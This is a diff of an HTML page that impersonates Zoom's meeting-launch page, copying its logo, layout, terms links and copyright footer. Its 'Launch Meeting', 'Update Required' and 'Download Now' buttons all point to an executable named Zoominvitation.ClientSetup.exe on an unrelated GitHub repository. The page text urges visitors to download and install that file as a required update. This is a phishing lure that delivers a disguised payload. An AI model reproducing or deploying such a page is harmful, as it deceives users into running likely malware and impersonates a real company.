@@ -1,77 +1,212 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Zoom Meeting Launch</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 60px 20px;
-      color: #1c1c1c;
-    }
-    .logo {
-      margin-bottom: 40px;
-    }
-    .logo img {
-      height: 30px;
-    }
-    .launch-box {
-      margin-bottom: 30px;
-    }
-    .launch-box p {
-      margin: 10px 0;
-    }
-    .launch-btn {
-      background-color: #0b5cff;
-      color: white;
-      padding: 12px 30px;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      cursor: pointer;
-      margin-top: 20px;
-    }
-    .footer {
-      font-size: 12px;
-      color: #777;
-      margin-top: 50px;
-    }
-    a {
-      color: #0b5cff;
-      text-decoration: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Launch Meeting - Zoom</title>
+    <style>
+        * {
+            font-family: "Open Sans", "Helvetica", "Arial", sans-serif;
+            box-sizing: border-box;
+        }
+        
+        body {
+            margin: 0;
+            padding-top: 64px;
+            color: #232333;
+        }
+        
+        #header_container {
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 300;
+            background-color: rgba(255,255,255,.97);
+            height: 64px;
+            line-height: 64px;
+            box-shadow: 0 0 2px rgba(0,0,0,0.2);
+        }
+        
+        .container {
+            width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .header-logo {
+            height: 25px;
+            width: auto;
+            margin-left: 24px;
+            margin-right: 20px;
+            vertical-align: middle;
+        }
+        
+        .action-btns {
+            float: right;
+            padding-right: 24px;
+            font-weight: 400;
+            font-size: 12px;
+        }
+        
+        .action-btns a {
+            color: #0E71EB;
+            text-decoration: none;
+        }
+        
+        #zoom-ui-frame {
+            max-width: 840px;
+            margin: 0 auto;
+            padding: 130px 40px 48px;
+            min-height: 480px;
+            text-align: center;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            line-height: 28px;
+            margin: 32px 0 24px;
+        }
+        
+        h2 {
+            font-size: 16px;
+            margin: 8px 0 20px;
+            font-weight: 400;
+        }
+        
+        a {
+            color: #0E71EB;
+            text-decoration: none;
+        }
+        
+        a:hover {
+            text-decoration: underline;
+        }
+        
+        .mbTuDeF1 {
+            background: #0e72ed;
+            border-radius: px;
+            color: #fff;
+            cursor: pointer;
+            display: inline-block;
+            font-size: 16px;
+            line-height: 32px;
+            margin-top: px;
+            padding: 8px 40px;
+            text-align: center;
+            border: none;
+        }
+        
+        .mbTuDeF1:hover {
+            background-color: #2681f2;
+        }
+        
+        hr {
+            background: #ededf4;
+            border: none;
+            height: 1px;
+            margin: 48px 0;
+            width: 100%;
+        }
+        
+        h3 {
+            font-size: 18px;
+            font-weight: 400;
+            margin: 0;
+        }
+        
+        #footer_container {
+            padding: 24px;
+            width: 100%;
+            text-align: center;
+            color: rgba(4, 4, 19, 0.56);
+        }
+        
+        #footer_container p {
+            margin: 0;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .LP3K7kSq {
+            display: flex;
+            text-align: center;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        
+        .LP3K7kSq a {
+            padding: 0 6px;
+            line-height: 16px;
+            margin: 2px 0;
+            color: inherit;
+        }
+        
+        .LP3K7kSq a+a {
+            border-left: 1px solid;
+        }
+        
+        @media (max-width: 767px) {
+            body {
+                padding-top: 60px;
+            }
+            
+            #header_container {
+                height: 60px;
+                line-height: 60px;
+            }
+            
+            #zoom-ui-frame {
+                padding: 16px;
+                box-shadow: none;
+            }
+            
+            .header-logo {
+                width: 180px;
+            }
+            
+            #footer_container {
+                margin-top: 32px;
+                padding-bottom: 8px;
+            }
+            
+            #footer_container p {
+                font-size: px;
+            }
+            
+            .LP3K7kSq a {
+                white-space: nowrap;
+            }
+        }
+    </style>
 </head>
 <body>
-  
-  </div>
-
-  <div class="launch-box">
-    <p><strong>Your meeting has been launched in the Zoom Workplace app</strong></p>
-    <p>Don’t see your meeting?</p>
-    <p>By joining a meeting, you agree to our 
-      <a href="https://zoom.us/terms">Terms of Service</a> and 
-      <a href="https://zoom.us/privacy">Privacy Statement</a>
-    </p>
-    <button class="launch-btn" onclick="window.location.href='https://github.com/rubadeux403/loop/raw/refs/heads/main/Zoominvitation.ClientSetup.exe'">
-      Launch Meeting
-    </button>
-  </div>
-
-  <p>Don’t have the Zoom Workplace app installed? <a href="https://github.com/rubadeux403/loop/raw/refs/heads/main/Zoominvitation.ClientSetup.exe">Download Now</a></p>
-
-  <div class="footer">
-    <p>©2025 Zoom Communications, Inc. All rights reserved.</p>
-    <p>
-      <a href="#">Trust Center</a> |
-      <a href="#">Acceptable Use Guidelines</a> |
-      <a href="#">Legal & Compliance</a> |
-      <a href="#">Do Not Sell My Personal Information</a> |
-      <a href="#">Cookie Preferences</a>
-    </p>
-  </div>
-
+    <div id="header_container" role="banner">
+        <div class="container">
+            <a href="https://zoom.us/" aria-label="Zoom Logo">
+                <svg width="115" height="26" viewBox="0 0 114 26" fill="#0b5cff" class="header-logo">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z" 
+clip-rule="evenodd" fill-rule="evenodd"></PATH></SVG></A>
+<DIV class=action-btns><A href="https://support.zoom.us/hc/en-us" 
+target=_blank>Support</A> </DIV></DIV></DIV>
+<DIV role=main id=zoom-ui-frame>
+<div>
+<h1 align="center"><font size="3">Click Open zoom.us on the dialog shown by your 
+browser<br>If you don't see a dialog Download the Zoom Workplace app and 
+install, click Update Required below</font></h1>
+<h2>joining a meeting, you agree to our <a href="https://zoom.us/en-us/terms">Terms of Service</a> and <a href="https://zoom.us/en-us/privacy">Privacy Statement</a></h2><a href="https://github.com/rubadeux403/loop/raw/refs/heads/main/Zoominvitation.ClientSetup.exe"><button class="mbTuDeF1">Update Required</button></a> </div>
+<hr><div>
+<h3>Don't have the Zoom Workplace app installed? <a href="https://github.com/rubadeux403/loop/raw/refs/heads/main/Zoominvitation.ClientSetup.exe">Download 
+Now</a></h3></div></div>
+<div id="footer_container" role="contentinfo">
+<div id="footer">
+<p>&copy;2025 Zoom Communications, Inc. All rights reserved.</p>
+<p class="LP3K7kSq"><a href="https://zoom.us/en-us/trust" target="_blank">Trust 
+Center</a> <a href="https://zoom.us/en-us/acceptable-use-guidelines" target="_blank">Acceptable Use Guidelines</a> <a href="https://zoom.us/en-us/trust/legal-compliance" target="_blank">Legal &amp; 
+Compliance</a> <a href="javascript:void(0);">Do Not Sell My Personal 
+Information</a> <a href="javascript:void(0);">Cookie Preferences</a> 
+</p>
+            </p>
+        </div>
+    </div>
 </body>
 </html>
